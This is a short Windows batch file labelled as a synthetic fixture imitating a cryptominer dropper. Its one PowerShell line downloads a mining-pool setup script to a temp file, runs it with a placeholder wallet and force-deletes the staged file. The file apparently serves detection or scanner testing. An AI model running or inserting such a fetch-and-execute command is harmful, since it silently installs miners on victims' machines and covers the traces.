@echo off
REM Synthetic fixture: silent miner-setup dropper shape. Downloads a
REM mining-pool setup script to a temp batch file, runs it with the
REM operator's wallet, then force-deletes the staged file.
powershell -Command "$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('http://download.c3pool.org/xmrig_setup/setup_example_miner.bat', $tempfile); & $tempfile 43FakeWalle7AddressForTes7ingPurposesOnlyDoNotPay000000000000000001; Remove-Item -Force $tempfile"
